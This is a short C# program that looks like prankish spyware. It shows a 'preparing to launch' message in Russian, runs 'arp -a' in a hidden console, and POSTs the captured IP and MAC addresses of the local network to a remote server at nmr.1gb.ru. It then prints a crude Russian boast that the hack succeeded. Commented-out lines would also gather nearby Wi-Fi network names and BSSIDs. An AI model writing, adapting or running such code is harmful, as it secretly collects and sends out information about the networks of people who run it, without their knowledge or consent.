using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace macaddr
{
    class Program
    {
        private static string POST(string Url, string Data)
        {
            System.Net.WebRequest req = System.Net.WebRequest.Create(Url);
            req.Method = "POST";
            req.Timeout = 100000;
            req.ContentType = "application/x-www-form-urlencoded";
            byte[] sentData = Encoding.GetEncoding(1251).GetBytes(Data);
            req.ContentLength = sentData.Length;
            System.IO.Stream sendStream = req.GetRequestStream();
            sendStream.Write(sentData, 0, sentData.Length);
            sendStream.Close();
            System.Net.WebResponse res = req.GetResponse();
            System.IO.Stream ReceiveStream = res.GetResponseStream();
            System.IO.StreamReader sr = new System.IO.StreamReader(ReceiveStream, Encoding.UTF8);
            //Кодировка указывается в зависимости от кодировки ответа сервера
            Char[] read = new Char[256];
            int count = sr.Read(read, 0, 256);
            string Out = String.Empty;
            while (count > 0)
            {
                String str = new String(read, 0, count);
                Out += str;
                count = sr.Read(read, 0, 256);
            }
            return Out;
        }
        private static string urlserver = "http://nmr.1gb.ru/nbspengine";

        static void Main(string[] args)
        {

            Console.WriteLine("Подготовка к запуску...");

            
            
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd";
            proc.StartInfo.Arguments = @"/C ""arp -a """;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();
            string bssid = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            /*
            proc.StartInfo.Arguments = @"/C ""netsh wlan show networks mode=bssid | findstr SSID,Сигнал """;
            proc.Start();
            string ssid = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            proc.StartInfo.Arguments = @"/C ""netsh wlan show networks mode=bssid | findstr BSSID """;
            proc.Start();
            string bssid = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();*/
            //Console.WriteLine(output);
            //Console.WriteLine(output.Length);
            /*
            StreamWriter str = new StreamWriter(string.Format(@"D:\screens\gr.txt"));
            for (int ji = 0; ji < bssid.Length; ji++)
            {
                str.Write(bssid[ji]);
            }
            str.WriteLine();
            str.Close();*/
            string resultpost = POST(urlserver, "bssid=" + bssid);
           // Console.WriteLine(resultpost);
            Console.WriteLine("Взлом ачка произошел успешно!");
           // Console.WriteLine(signall);
           // Console.WriteLine(ssid);
           // Console.WriteLine(bssid);
            Console.ReadKey();
        }

    }
}
